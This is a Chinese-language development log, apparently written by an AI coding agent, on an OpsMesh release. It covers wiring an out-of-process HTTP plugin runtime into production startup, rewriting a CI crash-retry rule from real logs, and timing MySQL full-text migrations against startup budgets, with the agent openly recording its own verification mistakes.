## 42. 2026-10-07｜⑤ TD-62 闭合：插件运行时模型定成"独立进程 + HTTP 契约"，并且第一次在生产启动路径上被构造

用户批复是「也可以现在完成，发版对外宣传」。宣传的前提是能力真的存在于交付物里，
所以这一轮的重心不是"再写一个插件框架"，而是**把最后那半缺口补掉**。

### 42.1 缺口精确定位在哪（复测，不是引用旧结论）

10-06 的复测把"三个扩展点零接线"改成了"三个扩展点都有触发点"，但本轮 grep 出来的是另一件事：

- `SetPluginManager(` 在**生产代码里零调用点**（只有测试在调）；
- `NewServer` 里没有任何一处构造 `plugin.NewManager()`。

也就是说：框架对、钩子对、触发点对，但**从来没有一个真实进程持有过管理器**。
这是 [[feedback-boundary-wiring-criterion]] 的第三种形态——"函数正确 ≠ 被调用；接线存在 ≠ 调用能通过；
被打印的身份要能被跨进程解析"之外再加一条：**测试自己注入依赖，会让"生产里没人构造它"永远不红**。
`plugin.Open(` 命中 0 也复测确认（所以市场 `plugin.bin` 无加载器这半句仍然成立，没顺手夸大）。

### 42.2 选型理由（为什么不是另外两种）

| 候选 | 否决/采纳依据 |
|---|---|
| Go `plugin.Open` | 要求插件与宿主**同 Go 版本、同依赖图、同平台架构**；本产品对外交付的是 goreleaser 二进制 + 固定基础镜像，客户改一行依赖就得重编插件——运维上不可交付。且 `plugin.Open` 命中 0 说明这条路从来没人走通过 |
| WASM | 要引入运行时（wazero/wasmtime），依赖面从"零依赖手写指标"变成"多一个沙箱要跟进 CVE"，而扩展点只有 3 个，收益不成立 |
| **独立进程 + HTTP** | 与本产品既有形态同构：12 个微服务就是独立进程 + gRPC，告警外发就是 HTTP + SSRF 校验 + 令牌。插件作者用任何语言写一个 HTTP 服务即可，不碰宿主工具链 ⇒ 收益明确、风险可控（只新增一种 handler 后端，不动既有 Manager 与 3 个扩展点）、兼容良好、可持续（新增扩展点的门禁不变） |

### 42.3 交付面（五件，缺一件就只是"函数正确"）

1. **传输** `internal/plugin/remote.go`：契约 `POST {plugin,hook,name,payload}` + `Authorization: Bearer`；
   响应 `{"decision":"allow|deny","reason":…,"payload":…}`；非 2xx / 超时 / 坏 JSON / 未知 decision 全部判错；
   响应体上限 1 MiB（与 P1-4「无界缓冲加上限」同判据）；`ErrDenied` 用 `errors.Is` 判定，
   不用错误文本比对——改一句文案就会把"策略拒绝"记成"运维故障"。
2. **装载与校验** `internal/controlplane/plugin_remote.go`：`--plugin-manifest` / `OPSMESH_PLUGIN_ALLOW_PRIVATE`；
   `DisallowUnknownFields`（`timeoutMs` 拼成 `timeout_ms`、`token` 代替 `tokenEnv` 都判错而不是静默取默认）；
   令牌**只能**经 env 引用；扩展点必须 ∈ `AllHooks()`；超时默认 2s、上限 30s；
   URL 走 `internal/egress.ValidateURL` 这一条共用策略（M7 的教训：保存时一套口径、运行期另一套）。
3. **启动接线** `internal/controlplane/server.go`：空清单 ⇒ 返回 `(nil,0,nil)` 且**不碰全局管理器**
   （保住"未启用时零行为变化"这条既有承诺，也让测试注入不被覆盖）；生产模式配错 ⇒ 终止启动。
4. **可观测面** `opsmesh_plugin_remote_plugins` + `opsmesh_plugin_hook_calls_total{hook,outcome}`，
   恒零预渲染；**插件名刻意不进标签**（自由文本入标签＝把基数控制权交给配置文件，与 P1-5 同判据）；
   `outcome` 三值 `ok/denied/error` 的区分是这条链路最重要的可观测点。
   标签集合与 `AllHooks()` 的一致性由 `internal/metrics/plugin_hook_labels_test.go` 对账（三条变异验证，见 §42.5）。
5. **出厂告警 + 参考实现**：`OpsMeshPluginHookFailed`（critical）/ `OpsMeshPluginHookDeniedBurst`（warning），
   compose 与 chart 两份、命名与 expr 一致；`plugins/remote-example/`（含契约文档 README）。

### 42.4 真机端到端（两个真实进程，不是测试注入）

条件：本机 Windows、`opsmesh.exe --mode=controlplane --store=memory --demo=true`、
HTTP 28080 / metrics 28091、插件进程 29101（环回）、清单绑定 `config.preSet` + `config.postSet`、
令牌经 `OPSMESH_PLUGIN_EXAMPLE_TOKEN` 注入；鉴权走真实的"首登强制改密"流程拿 token。

| 步骤 | 实测 |
|---|---|
| 启动 | 日志 `插件宿主已启用 plugins=1 manifest=…`、`[plugin] 注册成功: capacity-guard@1.0.0`（TD-62 原缺陷的直接反证） |
| 恒零基线 | 12 条 `opsmesh_plugin_hook_calls_total{…} 0` + `opsmesh_plugin_remote_plugins 1` 在**任何调用发生之前**就存在 |
| deny 路径 | `PUT {"maxTenants":0}` ⇒ **HTTP 400** `config update rejected by plugin policy`；插件日志 `decision=deny reason="maxTenants=0 会移除租户容量上限策略"`；响应体里**没有** reason（内部策略不外泄） |
| allow 路径 | `PUT {"maxTenants":5}` ⇒ 200，`GET` 读回 `maxTenants:5` |
| postSet | 插件日志同一次请求里第三条 `hook=config.postSet decision=allow`（pre 与 post 都被真实触发） |
| 指标 | `preSet ok=1`、`preSet denied=1`、`postSet ok=1`，其余仍为 0 |
| **fail-closed** | `kill` 掉插件进程后再 `PUT {"maxTenants":7}` ⇒ **HTTP 400**，且 `outcome="error"` +1（拔掉插件 ≠ 绕过准入） |
| 收尾 | 只杀本轮两个 pid，`ps -W` 复查残留为空 |

顺带被这条真机路径**证伪的一个草稿结论**：我原本用 `alertRetentionDays` 做改写断言的字段，
而 `PlatformConfig`（`platform_config.go:26-35`）**根本没有这个字段**——JSON 解码会静默忽略，
于是"改写生效"会在一个不存在的字段上恒真。改成真实字段 `maxTenants` 后断言才有意义。
这是 [[feedback-probe-target-verify]] 的同一课：**探针必须先自证目标存在**，否则测的是自己的想象。

也修掉一处会误导运维的日志：我最初打的是 `hooks=<AllHooks 全量>`，
读起来像"三个扩展点都已被接管"，而实际只绑了两个 ⇒ 改为打印 `plugins` 数与清单路径。

### 42.5 本轮的变异检验（四条，全部先证基线再打坏）

| 判据 | 变异 | 结果 |
|---|---|---|
| 标签集合 ↔ `AllHooks()` 对账 | 从 `pluginHookValues` 删掉 `task.preClaim` | `TestPluginHookLabelSetMatchesFrozenHooks` 判红 |
| 恒零预渲染 | 只渲染非零计数 | `TestPluginSeriesRenderAtZero` 与 `TestIncPluginHookConvergesLabels` 双双判红 |
| 标签基数收敛 | `oneOf(...)` 改成直接用入参拼 key | `TestIncPluginHookConvergesLabels` 判红（时序新增） |
| 告警引用的序列真在抓取面上 | 把 compose 里的 expr 指标名改成 `..._TYPO_total` | `TestShippedAlertRulesReferenceExportedMetrics` 判红并**点名该指标名**（证明它确实在扫我新加的这条规则，不是恰好通过） |

前两条变异跑完后 `sha256sum` 与被测文件一致（还原无残留），第三条同法。

### 42.6 Helm 渲染踩到的一处引号陷阱（值得记）

我在 chart 里把占位符写成 `"… {{ \"{{ $labels.hook }}\" }} …"`（YAML 双引号 + 反斜杠转义），
`helm template` 直接 `parse error … unexpected "\" in command`：
**Helm 是在 YAML 解析之前按原始字节取模板的**，所以转义不会被消掉。
本文件的既有约定是单引号包裹 `'{{ "{{ $labels.job }}" }}'`，改回后渲染通过：
8 个文档、`PrometheusRule` 1 个、规则 17 条，两条插件告警的 `expr/for/severity/summary` 都解析正确
（`summary` 渲染后仍是 `{{ $labels.hook }}`，即占位符活到了 Prometheus 求值期）。

### 42.7 一处诚实边界（写清楚，不发对外宣传里含糊过去）

- **市场 `plugin.bin` 仍然不能装载运行**（`plugin.Open` 命中 0）。本轮交付的是"外部进程接管 3 个扩展点"，
  两条路径不能合并成一句"插件市场可用"。README 与 `product-design.md` 已分两行写。
- **默认部署不启用**：需要显式配 `--plugin-manifest` 并重启；`opsmesh_plugin_remote_plugins` 为 0 就是没启用。
- **fail-closed 的代价已在 §42.4 实测**：插件不可达会让平台配置写入被拒。
  这条必须进对外文档与告警说明，否则客户会把"改不动配置"当成控制面故障。
- 端口占用自查在这一轮真的救了一次：候选端口 18080/18091 被别的项目的容器（`fs-iam`/`fs-datadev`）占用，
  脚本在第一步就退出而没有抢绑定，也没有去动那些容器。

### 42.8 我的新代码让一条**既有门禁**报了假阳性——而修它的过程中发现那条门禁还漏了一整类

全量本地测试跑出两条红，逐条归因（不是"看着不像我造成的就当别人的"）：

1. `internal/tlsutil` 的 `TestCertificateReloader_ReloadFailureKeepsOld` 在**净 HEAD 副本**里 3/3 复现
   （临时 worktree checkout `3223365`，不含本轮任何改动）⇒ 与我的改动无关。
   机理：该测试用固定 `time.Sleep(reloadWait)` 等 fsnotify，而 Windows 上 watcher 更慢；
   CI（Linux）同一条是绿的 ⇒ 属**本机环境 + 测试健壮性**问题，登记为 TD-82 而不是擅自改那条测试。
2. `internal/controlplane` 的 `TestEveryFrozenHookHasAFireSiteInControlPlane`（TD-62 ④ 那条门禁）
   被我新写的 `plugin_remote.go` 判红，报的是"触发了扩展点常量 **HookHandler**，但它不在 AllHooks() 里"。
   而 `HookHandler` 是 handler 的**函数类型**、不是扩展点常量——抓取正则 `plugin\.(Hook[A-Za-z]+)`
   把类型名当常量捕获了。这是一条**假阳性**，而假阳性的代价在本仓已记过一次：它会诱导人去"修"一个本来正确的东西。

修法不是放宽名字形状，而是**按声明事实过滤**：从 `internal/plugin/hooks.go` 读出真正声明为 `Hook` 类型的常量集合，
只有落在这个集合里的引用才算扩展点引用。判定面因此从双向升级成三向：
A. `AllHooks()` 里有 ⇒ 必须有触发点；B. 有触发点 ⇒ 必须在 `AllHooks()` 里；
C. **hooks.go 里声明了 ⇒ 必须进 `AllHooks()`**（新增：声明而未冻结的常量同样没有任何接线保证）。

五条变异验证（每条跑完立刻还原，三个被改文件事后逐字节比对 = 基线一致）：

| 变异 | 期望 | 实测 |
|---|---|---|
| M-A `plugin_remote.go` 里加一条**合法的**类型引用 `var _probe plugin.HookHandler = func(plugin.Event) error {…}` | 不报红 | `ok`——过滤面改按"hooks.go 里有没有声明过这个常量"判定，不再看名字形状；修前同一条代码会让门禁判红 |
| M-B hooks.go 加独立一行 `const HookGhostProbe Hook = "ghost.probe"` 而不进 AllHooks | C 方向判红 | **第一版没报红**——我的声明正则只认 `const (...)` 块内的缩进行，独立 `const` 行被漏掉。补 `(?:const\s+)?` 后重跑，判红并点名 `HookGhostProbe` |
| M-C2 声明 + 进 AllHooks + 登记 `constNameOf` 三处都补齐，但控制面无触发点 | A 方向判红 | 判红：`扩展点常量 HookGhostProbe 在 AllHooks() 里，但 internal/controlplane 下没有触发点` |
| M-D 从 AllHooks 删掉仍被触发的 `HookTaskPreClaim` | B 方向判红 | 判红，且 B 与 C 两个方向同时报（符合预期：删了清单没删声明） |
| 基线（全部还原后） | 不报红 | `ok`，日志 `hooks.go 声明 3 项，AllHooks=3 项，控制面引用 3 项，三向一致（扫描 96 个文件）` |

中途还修掉一处会误导人的文案：`constNameOf` 未收录某个 Hook 时返回空串，那个空串会被塞进 `frozen` 当键，
报错文案就成"扩展点常量  在 AllHooks() 里"（名字是空的，读者无从下手）；改成直接报"请同步 `constNameOf`"。

**跑变异这件事自己也出了一次自伤，必须记**：第一版 python harness 把 `restore()` 写在 `go test` **之前**，
于是 M-A 与 M-C 那两轮的"结果"测的都是干净基线——`M-A ok`（看着像"过滤面生效"）、
`M-C ok`（看着像"A 方向失灵，这条门禁是假的"）。两个结论都是**我的验证器没把变异留在场上**造出来的，
而后者如果被采信，我会去"修"一条本来正确的门禁。发现契机是同一个变异在 bash 版里判红、python 版里判 ok，
两边互相矛盾才回头查语句顺序。规矩补一句：
**harness 的"施加变异 → 跑测试 → 还原"三步顺序要在代码里显式注释钉住，
且跑测试前先把"变异标记仍在场"打出来**（`grep` 一次被插入的那一行即可）；
否则"我根本没测到"会被记成"它没抓到"。与 §37.1（恒真判据）、[[feedback-probe-target-verify]] 同族。

**值得记住的两点，不是"我修了个 bug"**：
① 门禁的**过滤面本身也是判定面**——M-B 第一次"没报红"如果我不跑变异就宣称"三向对账已生效"，
留下的就是一个我以为存在、实际不存在的方向（与 §37.1 同族）；
② 新代码让既有门禁变红时，先用净副本判归因，再判"门禁错还是我错"：这次两边都有错
（门禁的形状判据太宽，而我的新引用恰好踩在它边界上）。

---

## 43. 2026-10-07｜TD-80：重试判据从"报错文本白名单"换成现象级三条件，而**真实日志形状把我预想的写法两次证伪**

### 43.1 为什么现在能动它

TD-80 登记时的阻塞条件是"`ci.yml` 是并行 agent 的在途改动"。现在 `git status` 里该文件干净
（他们那批 `-S info` 已落进 `ci.yml:486` 之后并推送），阻塞条件消失 ⇒ 按"缺前置就挨个补前置"的规矩开工。

判据本身的缺陷（§36 已记）：`build-test` 的重试只在日志命中两条**历史报错字符串**时才发生，
2026-10-06 run `37414728836` attempt 1 里 `agent_JZ` 在全部用例通过之后才崩，文本不命中
⇒ 被判成确定性失败 ⇒ 连带 11 个下游 job skip；同一 sha 的 attempt 2 十二个 job 全绿。

### 43.2 关键一步是**去取真实日志**，而不是按记忆写判据

`gh run view 37414728836 --attempt 1 --log-failed` 取到 906 行，去掉 job/step 前缀与时间戳后逐行核对：

| 形态 | 我的预想 | 真实日志（run 37414728836 attempt 1） | 结论 |
|---|---|---|---|
| 崩溃头 | `fatal error: unexpected signal during runtime execution` | 第 688 行是**裸 `SIGSEGV: segmentation violation`**，`^fatal error: ` 整份日志计数 **0** | 按预想写 ⇒ 这条门禁**永远不命中它要防的那次事故**（死代码而 CI 全绿） |
| "跑完"证据 | 认测试二进制的裸 `PASS` | 第 687 行确有 `PASS` | 成立，但只对 `-v` 单包腿 |
| 内存读数 | 宿主不给内存 | 峰值 RSS 260244 KB、`MemAvailable=14952MB` | 与宿主内存无关，是 GC 路径自己的崩 |
| 业务失败侧 | — | `--- FAIL` 计数 **0** | 与"非断言失败"一致 |

第二次证伪来自本机实测（go1.26.6，同一 `go test` 三个形态）：

| 调用形态 | 裸 `^PASS$` | `^ok\s` |
|---|---|---|
| 单包 + `-v`（agent 两批） | 1 | 1 |
| 单包、非 `-v` | **0** | 1 |
| 多包、非 `-v`（store/cp/pkgs/cmd 各腿） | **0** | 每包一行 |

⇒ 判据 ① 若只认 `PASS`，四条 `-race` 腿的重试会**永久不触发**，而自测与 CI 都不会红。
这条就是"判据看不见缺陷时没有提示，只有绿色的结论"的又一实例。

### 43.3 落成的判据（`deploy/scripts/ci-infra-death.sh`，退出码 0=可重试 / 1=判红 / 2=判据失明）

三条同时成立才重试一次：① 用例跑完（`^PASS$` **或** `^ok\s`，按上面实测的两种可见形态）；
② 崩溃段（头之后第一段落）的**每个**栈帧都属 runtime；③ 日志里没有 `--- FAIL:`。
另加一条具名例外：ThreadSanitizer 自己的分配器 OOM（它没有 Go 的崩溃头与栈）。

判据从内联搬进脚本的第二个理由：**搬进来才能被夹具钉住**。原写法在 `ci.yml` 的 `run:` 块里，
`actionlint` 只看内联块、`shellcheck` 那一步又只看 `git ls-files '*.sh'`，等于谁都不验它。

② 为什么不是"只看顶帧"，也是真实日志教的：本机造了个 8 goroutine 抢同一张 map 的用例，
崩溃段是 `internal/runtime/maps.fatal(...)` 紧跟 `tmpfailprobe/d.Hammer(...)`——
**顶帧看着就像 runtime，第二段才是业务帧**。只看顶帧会把产品级并发缺陷判成"可重试"。
同一批本机样本还留下两条：
- 真实 nil 解引用 panic **先**打印 `--- FAIL: TestNilDeref` 再打 panic 栈 ⇒ ③ 真挡得住（不是推测）；
- runtime 与二进制的输出写同一个 fd 且不加锁，实测出现过 `fatal error: PASS` / `concurrent map writes`
  这种被劈开的行，**而 go 仍打印 `ok` 并返回退出码 0** ⇒ ① 只是必要条件，真正把误判挡住的是 ②。

### 43.4 证据链（本机，逐项可复跑）

A. 判据自测 `bash deploy/scripts/ci-infra-death.selftest.sh`：**16 例全过**（阳性 5 / 阴性 9），
夹具形态自检 10/10——夹具本身也在被判（真实事故的两个特征：`^fatal error: ` 计数为 0、崩溃头是裸信号行，
若哪天被改成就"跟着实现一起说谎"）。

B. 真实日志回归：对 `run 37414728836 attempt 1` 整步骤日志判 `retry`（崩溃段 10 帧全属 runtime）；
对 6 份本机真实产物（含非 `-v` 多包失败、nil panic、map 并发写 5 轮）逐份判红。

C. 接线侧（不是"脚本存在"，而是"run_batch 真的调用它"）：用 `python+yaml` 从 `ci.yml` 里
**抽出线上那段 `run_batch` 定义**（不是我重写的一份），三个场景驱动：

| 场景 | 期望 | 实测 |
|---|---|---|
| 两次都崩（真实崩溃块喂给假命令） | 重试一次后判红 | `run_batch 返回 rc=2`，留痕表新增一行「仍失败 ⇒ 判红」 |
| 崩一次后通过 | 判绿但必须留痕 | `[scen2] OK`，留痕「通过（随机红被重试消化，需按批次继续查）」 |
| 真实断言失败 | **不得**重试 | 只跑一次输出，`判据结论: red: 日志含 --- FAIL:`，rc=1 |

留痕写出侧：`GITHUB_STEP_SUMMARY` 用 EXIT trap，所以"步骤中途判红"也能把账落下来（实测摘要表格两行）。

D. 新门禁 §19 的变异验证（每条跑完立刻还原并 `sha256sum` 双向核对）：

| 变异 | 期望 | 实测 |
|---|---|---|
| M1 把内联 `OOM_PAT=` 抄回 ci.yml | 判据① 红 | 红（"重新出现内联 OOM_PAT 赋值"） |
| M2 摘掉 `run_batch` 对判据脚本的调用 | 判据② 红 | 红（"run_batch 不再调用"） |
| M3 摘掉自测步骤 | 判据③ 红 | 红（缺 `bash …selftest.sh`） |
| M4 摘掉 step summary 留痕 | 判据④ 红 | 红（缺重试留痕） |
| M5 把判据里 TSan 的行首锚定去掉 | 判据⑤ 红 | 红（自测第 11 例判红 ⇒ 证明⑤真的在跑自测） |
| 基线（全部还原） | 5 条全绿 | 5 条全 PASS；`ci.yml` 与 `ci-infra-death.sh` 还原后 sha256 与开工前一致 |

M5 这条值得单独说：它变异的是**判据自己**，而 §19 通过"真跑一次自测"抓到它。
若 §19 只做静态对账（文件在、调用点在），M5 会一路绿灯。

E. 部署资产门禁整跑：**PASS=63 FAIL=0 SKIP=1**（原 58 + 本节 5 条）；
`shellcheck -S style` 对两份新脚本 0 告警；`actionlint -shellcheck=` 对 ci.yml 0 告警。

### 43.5 顺带把本轮 CI 的两个红分归因（不是一个原因）

推 `9f0350f` 后 CI 红，同时 base `3223365` 那一轮也红——但两件事无关：

| run | ref | 红的 job | 根因 | 归属 |
|---|---|---|---|---|
| `37508203504` | `3223365`（不含我的插件代码） | Frontend (Vue3 Enterprise) | `exit code 124`：从 npmmirror 下载 Playwright chromium 超时 | 流水线抖动，非缺陷；同一 job 在 `37509481389` 是绿的 |
| `37509481389` | `9f0350f`（我的 HEAD） | build-test | `golangci-lint` errcheck 3 条：`internal/plugin/remote.go:190`（`io.Copy` 未检查）、`plugins/remote-example/main.go:55`（`io.WriteString`）、`:146`（`srv.Shutdown`） | **我的代码**，已修 |

修法不是加 `//nolint`，也不是往 `.golangci.yml` 的 exclude-functions 里塞豁免：
`remote.go` 那处 drain 本就是冗余（响应体在下面 `ReadAll` 已读完，上限 1 MiB）⇒ 删掉；
示例插件的 `io.WriteString` 换成配置已豁免的 `ResponseWriter.Write` 形态；
`srv.Shutdown` 改成真检查并打到 stderr——示例插件是写给宿主作者看的，静默吞错会被当成"可以忽略"。

### 43.6 我的本地检查清单里有个洞（这条比修三条告警更该记）

推之前跑了 `gofmt`、`go vet`、`go test`（5 个包全 ok）、门禁整跑、Helm 渲染，
**唯独没跑 `golangci-lint`** ⇒ 三条 errcheck 只在 CI 暴露，白花一轮 15 分钟。
本仓 `.golangci.yml` 是 `check-blank: true`（`_ =` 也必须显式豁免），所以"我用 `_ =` 了"在这里不是理由。
现在补进固定动作：`golangci-lint run ./...`（本机 v2.14.0，CI 钉 v2.13.2 ⇒ **终判仍在 CI**，
本机只用于"别再犯同一类"，不能声称等价）。

---

## 44. 2026-10-07｜存量迁移演练：020/021 的阈值实测压在 **30 万行**，而"先迁移后放量"这条惯例并不存在

§39 第 3 项给了"切版前要重做存量演练"的硬理由（020/021 重建 `ci_items`、窗口内不放开并发写、撞
`deploy.sh` 的 120s 健康预算）。本节是那次演练的**执行结果**（用户 14:4x 指令"先修台账，再迁移演练"）。
载体：`mysql:8.0`（实测 mysqld **8.0.46**）+ 出厂 `deploy/monitoring/mysql.cnf`，独立容器、127.0.0.1:33066；
先真实应用 001..019（**19/19 逐文件取 mysql 自己的退码全过、53 张表**），再按行数阶梯只计时 020/021 四条语句。

### 44.1 载体先骗了我两次（这两条本身也是交付事实）

- **配置没生效**：Windows bind-mount 的权限让 mysqld 打
  `World-writable config file '/etc/mysql/conf.d/custom.cnf' is ignored`，第一遍 `@@innodb_buffer_pool_size`
  实测 **0.125G**（默认值）而不是出厂的 1G。改成 `docker cp` + `chmod 644` 后才拿到
  `bp=1G | sync_binlog=1 | trx_commit=1 | O_DIRECT | ngram=2`。
  **教训：挂进去 ≠ 读进去，配置类断言要问运行中的进程自己。**
- **被我弄坏过一次**：我在 entrypoint 首次初始化尚未完成时 `docker restart`，数据目录处于未干净关闭状态，
  之后 redo 改大小报 `Cannot create redo log files because data files are corrupt or the database was not
  shut down cleanly`，容器 exit=1。而因为 cnf 把 `log_error` 重定向到 `/var/lib/mysql/error.log`，
  **`docker logs` 里一行 mysqld 报错都没有**——这既是我当时的排障障碍，也是对客户的真实影响：
  宿主机上 `docker logs opsmesh-mysql` 看不到数据库的错误。
- 顺带一条卫生项：cnf 里的 `innodb_log_file_size = 256M` 在 8.0.30+ **已不生效**（实测
  `innodb_redo_log_capacity` 仍是默认 100M）——属于"以为调过了"的参数。
- 行数取值有出处，不是我拍的：`docs/deployment-scenarios.md:66-70`（分布式 ≤10000 纳管设备）、`:138`
  （单机房 ≤500 台）⇒ CI 数按设备数的倍数外推，**10 万行即文档上限的保守值**，100 万行是"超宣称规模 10×"
  的压力界。种子 attrs 为 8 键 JSON、中英混合，**约 220 B/行**，所以表里同时记"索引文本量"——成本跟着文本量走。

### 44.2 阈值曲线（同容器、同 schema、逐条计时；单位秒）

| ci_items | 索引文本量 | 020#1 加 STORED 生成列 | 020#2 建 FT(3 列) | 021#1 DROP INDEX | 021#2 建 FT(7 列) | 合计 | 占 120s 预算 |
|---|---|---|---|---|---|---|---|
| 1 000 | 0.2 MiB | 1.6 | 2.7 | 1.1 | 1.7 | **7.9** | 7% |
| 10 000 | 2.2 MiB | 1.3 | 6.0 | 0.8 | 3.8 | **12.5** | 10% |
| 100 000 | 22.0 MiB | 3.0 / 4.4 | 16.8 / 20.1 | 0.8 / 1.0 | 20.0 / 21.7 | **41.2 / 48.0** | 34–40% |
| 300 000 | 65.9 MiB | 6.8 | 56.0 | 0.8 | 52.7 | **117.0** | **97%** |
| 1 000 000 | 219.7 MiB | 17.2 | 157.2 | 0.8 | 199.9 | **375.6** | 313% |

- 10 万档**跑了两遍**（41.2 / 48.0）⇒ 单次测量约 ±16%，量级与阈值结论不受影响。
- `DROP INDEX` 与行数无关（恒 0.8–1.1s）；成本全在两条"建"和一条"加列"。
- 边际速率：**建全文索引 ≈ 0.7–0.85 s / MiB 索引文本**；**加 STORED 生成列 ≈ 0.017 s / 千行**（COPY 整表重建）。
- **阈值压在 30 万行（≈66 MiB 索引文本）= 预算的 97%**。更慢的盘、更肥的 attrs、或同一 ctx 里别的迁移多占几秒，
  都会把它推过 120s。
- 方向上这些数是**下界**：载体是 32 核本机 NVMe + 1G 缓冲池，客户 VM（4 核 / 云盘 / 更小 bp）几乎必然更慢。

### 44.3 "不放开并发写"——从引文档升级为 MySQL 自己的裁决，再加活体实测

三条 `ALGORITHM=`/`LOCK=` 探针（支持性是能力问题、与行数无关，故空表即可判定）：

```
ALTER … ADD COLUMN … STORED, ALGORITHM=INSTANT
  → ERROR 1845 (0A000): ALGORITHM=INSTANT is not supported for this operation.
ALTER … ADD COLUMN … STORED, ALGORITHM=INPLACE
  → ERROR 1845 (0A000): ALGORITHM=INPLACE is not supported for this operation. Try ALGORITHM=COPY.
ALTER … ADD FULLTEXT INDEX … WITH PARSER ngram, ALGORITHM=INPLACE, LOCK=NONE
  → ERROR 1846 (0A000): LOCK=NONE is not supported. Reason: Fulltext index creation requires a lock. Try LOCK=SHARED.
```

即：**加 STORED 生成列必须整表重建（COPY），建全文索引期间禁止并发写**——§39 靠 MySQL 文档说的话，
mysqld 自己说了一遍。

活体停顿实测（10 万行）：独立客户端**持续直接 INSERT `ci_items`**，每条成功后由 MySQL 自己盖 `NOW(3)`
时间戳，同时执行 021 的 DROP+ADD（墙钟 21.7s）⇒ **最大相邻间隔 19 826 ms ≈ 19.8s**，>3s 的写入 1 条，
整个窗口只完成 10 条。写侧被禁时长≈建索引时长，实证成立。

（第一版探针我把写入器写到另一张表 `_writer_log`，于是测出"最大间隔 1.0s、没有停顿"的**假结论**——
锁的是 `ci_items`，写别的表当然不受影响。判据改对后重跑。记这条是因为它正是"我的验证动作在骗我"的形状。）

### 44.4 预算其实有两道，不是一道

- 交付侧：`deploy/docker/scripts/deploy.sh:1014` `wait_for_healthy controlplane 120`。
- 应用侧：`internal/store/sql.go:242-244` `migrationLockTimeoutSec=60` + `migrationWorkBudgetSec=60`，
  `:346-349` 把两者之和做成**一次 `runMigrations` 的 ctx 上限（120s，含 GET_LOCK 等待）**，
  `:187` 之后按 `migrationInitAttempts=20 × 3s` 重试。
- 迁移在**监听之前**：`cmd/opsmesh/main.go:93` 先 `controlplane.NewServer(cfg)`（内部同步建 store → 跑迁移），
  `:98` 才 `srv.Start()` ⇒ 迁移期间 8080 根本还没起、`/health` 不存在。
- 合起来：**30 万行时两道 120s 同时贴边**。越过阈值后客户看到的症状是 `deploy.sh up` 报"120s 内未就绪"，
  而真实原因是数据量导致的迁移耗时——症状与成因不同名，正是这类问题最难归因的地方。

### 44.5 顺带查到的两条落差（各自独立成立）

1. **021 注释说"按既有惯例『先迁移后放量』执行"，而这个惯例在仓库里不存在**：`deploy.sh` 里 `迁移|migrat`
   **零命中**；`git ls-files | grep -iE 'upgrade|migration-guide'` 为空；`docs/deployment-guide.md` 只有
   `helm upgrade` 的 Secret 复用注意（:378-385）与探针路径的升级顺序（:146-157）。
   ⇒ 演练恰恰需要的那一步（离线迁移）**既无脚本也无文档**。
2. **多租户 schema 模式下成本是"每 schema 一份 + 全局写锁内首触"**：`--multi-schema` 默认 false
   （`internal/config/config.go:563`，deploy/ 里无人设置 ⇒ 出厂形态是单 schema，上面的阈值直接适用）。
   但若客户启用：`MultiSchemaStore.storeFor()`（`internal/store/multi_schema.go:241-267`）**懒建 per-tenant
   store 且在 `m.mu` 写锁内构造**，构造即跑迁移。实测每 schema 固定成本 ≈ **7.9s（1 千行）**，之后随该租户
   自身行数上升 ⇒ 升级后每个租户的**第一个请求**承担整段 DDL，并把其他冷租户一起挡在写锁后面；
   症状是"健康检查早过了但首访极慢/超时"，比启动超时更难归因。

### 44.6 建议（等你拍；本轮只补证据与判据，未改任何产品行为）

1. 把 020/021 这类"重建表 + 禁写"的迁移从**启动内联**改成**部署前显式步骤**（`deploy.sh` 加 `migrate`
   子命令，或 `up` 之前跑一次性容器），启动只做版本校验；等待预算随数据量可配（如
   `MIGRATION_WAIT_BUDGET`，默认仍 120s）。
2. 给客户一条可执行的判据：升级前查 `SELECT COUNT(*), SUM(LENGTH(CAST(attrs AS CHAR))) FROM ci_items`，
   超过约 **20 万行 / 45 MiB** 就预约维护窗口（按 0.85 s/MiB 外推并留一倍余量）。
3. `--multi-schema` 的发布说明要写明"升级后逐租户首访会慢"，或提供一个按租户串行的预热脚本。
4. 台账侧建议**新开一条债项**承接 1/2/3；**编号我不占**，避免与并行线撞号（本仓刚修过 TD-62 双号）。
5. 载体侧两条卫生项顺手可修：cnf 的 `innodb_log_file_size` 换成 `innodb_redo_log_capacity`；
   若保持 `log_error` 重定向，交付文档要写明去哪儿看，否则客户面对的是空的 `docker logs`。

### 44.7 同日收尾：那两条 cnf 卫生项已经修掉，并给了实测（不是"看起来对"）

kilo 收线后用户把仓库整体交给我，我先清了 §44.6 第 5 条里我自己判定低风险的两项（`deploy/monitoring/mysql.cnf`
只有 `docker-compose.prod.yml:84` 一处消费，且没有任何门禁断言其内容——这两点是动手前现查的，不是印象）。

- **改动**：`innodb_log_file_size = 256M` ⇒ `innodb_redo_log_capacity = 256M`（按原作者意图，用 8.0.30+ 真正生效的键）；
  删除 `log_error = /var/lib/mysql/error.log`（让错误日志留在 stderr，符合容器惯例），`log_error_verbosity = 3` 保留。
  两处都在文件里写了"为什么改"的注释，并写明旧键是**静默失效**而不是报错。
- **实测（真容器 `mysql:8.0`，端口错开在用的 33066，验后即删）**：
  `SELECT @@innodb_redo_log_capacity` = **268435456（256.0M）**——旧写法下同一查询实测是默认 100M，
  所以这条是"生效"而不是"没报错"的直接证据；`@@innodb_buffer_pool_size` 仍 1.0000G；容器 `running=true / exit=0`，
  **没有 unknown variable**（参数名写错时 mysqld 直接起不来，这正是必须实跑的理由）；
  `docker logs` 在初始化阶段就收到 **25 行** mysqld 的 `[System]/[Server]` 输出（改前那次 exit=1 时控制台是 0 行）。
- 一条如实说明：stderr sink 下 mysqld 会打一行 Note
  `Error-log destination "stderr" is not a file. Can not restore error log messages from previous run.`
  这是信息性提示（不能跨重启回放旧日志），不是错误；除此之外日志里没有任何 error 级行。
- 验证面：`validate-deploy-assets.sh` 复跑 **PASS=63 FAIL=0 SKIP=1**；`docker compose --env-file .env -f
  docker-compose.prod.yml config` 干跑 rc=0（只解析、不启动）。
- **仍未做的**：§44.6 第 1/2/3 条属行为与文档面改动（迁移前置、维护窗口判据、多租户首触说明），
  已作为 **TD-83** 记账，不在这一笔里顺手改。
